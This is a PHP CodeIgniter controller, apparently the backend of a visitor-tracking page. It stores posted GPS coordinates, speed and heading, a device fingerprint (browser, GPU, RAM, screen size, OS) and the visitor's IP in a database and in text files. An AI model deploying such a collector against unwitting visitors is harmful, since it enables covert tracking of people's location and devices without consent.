<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Location extends CI_Controller
{

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */
	public function index()
	{
		$this->load->view('location_view');
	}
	public function load_result()
	{
		header('Content-Type: text/html'); {
			$lat = $_POST['Lat'];
			$lon = $_POST['Lon'];
			$acc = $_POST['Acc'];
			$alt = $_POST['Alt'];
			$dir = $_POST['Dir'];
			$spd = $_POST['Spd'];

			$data['info'] = array();

			$data['info'] = array(
				'lat' => $lat,
				'lon' => $lon,
				'acc' => $acc,
				'alt' => $alt,
				'dir' => $dir,
				'spd' => $spd,
				'created_at' => date('Y-m-d H:i:s'),
				'created_ip_address' => ip_address(),
			);
			$res = $this->Md_database->insertData(RESULT_INFO, $data['info']);

			$jdata = json_encode($data);

			$f = fopen('result.txt', 'w+');
			fwrite($f, $jdata);
			fclose($f);
		}
	}

	public function load_error()
	{
		header('Content-Type: text/html'); {
			$denied = $_POST['Denied'];
			$una = $_POST['Una'];
			$time = $_POST['Time'];
			$unk = $_POST['Unk'];
			$support = 'Geolocation is not supported!';

			if (isset($denied)) {
				$f = fopen('result.txt', 'w+');
				fwrite($f, $denied);
				fclose($f);
			} elseif (isset($una)) {
				$f = fopen('result.txt', 'w+');
				fwrite($f, $una);
				fclose($f);
			} elseif (isset($time)) {
				$f = fopen('result.txt', 'w+');
				fwrite($f, $time);
				fclose($f);
			} elseif (isset($unk)) {
				$f = fopen('result.txt', 'w+');
				fwrite($f, $unk);
				fclose($f);
			} else {
				$f = fopen('result.txt', 'w+');
				fwrite($f, $support);
				fclose($f);
			}
		}
	}

	public function load_info()
	{
		header('Content-Type: text/html'); {
			$ptf = $_POST['Ptf'];
			$brw = $_POST['Brw'];
			$cc = $_POST['Cc'];
			$ram = $_POST['Ram'];
			$ven = $_POST['Ven'];
			$ren = $_POST['Ren'];
			$ht = $_POST['Ht'];
			$wd = $_POST['Wd'];
			$os = $_POST['Os'];

			function getUserIP()
			{
				// Get real visitor IP
				if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
					$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
					$_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
				}
				$client  = @$_SERVER['HTTP_CLIENT_IP'];
				$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
				$remote  = $_SERVER['REMOTE_ADDR'];

				if (filter_var($client, FILTER_VALIDATE_IP)) {
					$ip = $client;
				} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
					$ip = $forward;
				} else {
					$ip = $remote;
				}
				return $ip;
			}

			$ip = getUserIP();
			//
			$data['dev'] = array();

			$data['dev'][] = array(
				'platform' => $ptf,
				'browser' => $brw,
				'cores' => $cc,
				'ram' => $ram,
				'vendor' => $ven,
				'render' => $ren,
				'ip' => $ip,
				'ht' => $ht,
				'wd' => $wd,
				'os' => $os
			);

			$jdata = json_encode($data);

			$f = fopen('info.txt', 'w+');
			fwrite($f, $jdata);
			fclose($f);
		}
	}
}
